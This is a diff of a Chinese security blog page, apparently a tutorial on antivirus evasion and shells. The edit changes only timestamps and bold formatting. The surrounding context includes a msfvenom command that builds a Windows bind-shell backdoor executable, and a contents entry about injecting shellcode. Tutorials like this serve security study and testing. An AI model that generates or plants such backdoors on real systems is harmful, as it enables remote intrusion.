@@ -30,7 +30,7 @@
 <meta property="og:description" content="该文章暂无概述">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2023-02-03T14:54:00.000Z">
-<meta property="article:modified_time" content="2023-12-12T08:54:54.102Z">
+<meta property="article:modified_time" content="2023-12-17T08:51:38.885Z">
 <meta property="article:author" content="Ghost">
 <meta property="article:tag" content="免杀">
 <meta property="article:tag" content="shell">
@@ -249,7 +249,7 @@ shellcode 并跳回原程序入口</span></a></li></ol></li><li class="nav-item 
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-12-12 16:54:54" itemprop="dateModified" datetime="2023-12-12T16:54:54+08:00">2023-12-12</time>
+      <time title="修改时间：2023-12-17 16:51:38" itemprop="dateModified" datetime="2023-12-17T16:51:38+08:00">2023-12-17</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -346,7 +346,7 @@ shellcode 并跳回原程序入口</span></a></li></ol></li><li class="nav-item 
 <h3 id="生成shell"><strong>1、生成shell</strong></h3>
 <ul>
 <li><strong>生成未加密正向shell
-</strong>，lhost：目标机（靶机）IP，可不指定****</li>
+，lhost：目标机（靶机）IP，可不指定</strong></li>
 </ul>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell/ **bind_tcp** lhost=127.0.0.1 lport=4444 -a x86 --platform win -f exe -o test-1.exe</span><br><span class="line"><span class="comment">#-p 是payload  -a 目标机架构  -f 是生成的后门的格式  -o 是输出文件名</span></span><br></pre></td></tr></table></figure>
 <p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203125348597-1652951932.png" /></p>
